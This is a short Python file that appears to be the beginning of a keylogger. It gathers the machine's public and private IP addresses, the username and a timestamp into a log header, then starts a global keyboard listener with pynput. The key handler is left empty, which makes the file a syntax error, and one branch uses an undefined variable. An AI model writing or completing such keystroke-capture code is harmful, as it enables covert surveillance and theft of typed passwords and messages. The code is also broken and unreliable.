from pynput.keyboard import Key, Listener
import datetime
import os
import random
import requests
import socket
import platform

public_ip = requests.get("https://api.ipify.org").text
private_ip = socket.gethostbyname(socket.gethostname())
print(private_ip)
system = platform.system()

def clear():
    if system == "Linux" or system == "Darwin":
        os.system("clear")
    elif plt == "Windows":
        os.system("cls")
    else:
        pass

if system == "Windows":
    user = os.path.expanduser("~").split("\\")[2]
elif system == "Linux":
    user = os.path.expanduser("~").split("/")[2]
else:
    user = None
date_time = datetime.datetime.now()


clear()

msg = f"[START OF LOGS]\n  *~ Date & Time: {date_time}\n  *~ Username: {user}\n  *~ Public IP: {public_ip}\n  *~ Localhost: {private_ip}\n\n"

logged_data = []
logged_data.append(msg)


def on_press(key):


with Listener(on_press=on_press) as listener:
    listener.join()